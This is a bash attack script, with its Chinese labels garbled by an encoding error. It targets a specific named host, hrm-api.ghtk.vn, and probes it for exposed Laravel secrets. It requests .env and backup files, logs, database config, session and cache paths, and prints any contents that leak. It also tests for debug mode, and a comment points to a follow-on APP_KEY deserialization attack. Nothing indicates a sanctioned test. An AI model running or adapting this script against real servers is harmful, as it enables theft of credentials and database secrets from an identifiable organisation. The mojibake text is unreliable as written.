#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ Laravelè·¯å¾„æ³„éœ²åˆ©ç”¨ï¼šhrm-api.ghtk.vn"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="hrm-api.ghtk.vn"
BASE_PATH="/var/www/html"

echo "[*] å·²çŸ¥è·¯å¾„ï¼š$BASE_PATH/storage/api-docs/"

echo ""
echo "[*] æµ‹è¯•Laravelå¸¸è§æ•æ„Ÿæ–‡ä»¶"
LARAVEL_FILES=(
    "/storage/logs/laravel.log"
    "/.env"
    "/.env.backup"
    "/.env.example"
    "/storage/app/.gitignore"
    "/storage/framework/sessions/"
    "/storage/framework/cache/"
    "/bootstrap/cache/config.php"
    "/config/database.php"
)

for file in "${LARAVEL_FILES[@]}"; do
    echo -n "  $file â†’ "
    status=$(curl -sk "https://$TARGET$file" -w "%{http_code}" -o /tmp/laravel_file -m 3 2>/dev/null)
    echo "$status"
    
    if [ "$status" == "200" ] && [ -s /tmp/laravel_file ]; then
        echo "    âœ… æ–‡ä»¶æ³„éœ²ï¼"
        cat /tmp/laravel_file | head -30
        echo "â”â”â”â”â”"
    fi
done

echo ""
echo "[*] æµ‹è¯•Laravelè°ƒè¯•æ¨¡å¼"
curl -sk "https://$TARGET/nonexist" | grep -i "whoops\|laravel\|symfony" && echo "  âš ï¸  Laravel Debugæ¨¡å¼å¼€å¯ï¼"

echo ""
echo "[*] æµ‹è¯•Laravelå¯†é’¥çˆ†ç ´ï¼ˆAPP_KEYï¼‰"
# å¦‚æœèƒ½è·å–.envæ–‡ä»¶ï¼Œå¯ä»¥å°è¯•ååºåˆ—åŒ–æ”»å‡»

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
